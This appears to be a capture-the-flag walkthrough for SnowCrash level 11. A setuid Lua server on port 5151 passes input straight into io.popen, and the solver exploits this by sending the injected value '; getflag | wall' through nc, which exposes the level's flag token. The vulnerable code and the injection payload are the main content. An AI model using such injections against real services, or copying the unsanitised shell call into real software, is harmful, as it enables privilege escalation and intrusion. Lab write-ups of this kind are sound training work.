
```sh
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```
```sh
level11@SnowCrash:~$ cat level11.lua 
```

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
```sh
level11@SnowCrash:~$ netstat -tuln | grep 5151
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: ; getflag | wall
                                                                               
Broadcast Message from flag11@Snow                                             
        (somewhere) at 1:11 ...                                                
                                                                               
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                      
                                                                               
Erf nope..
```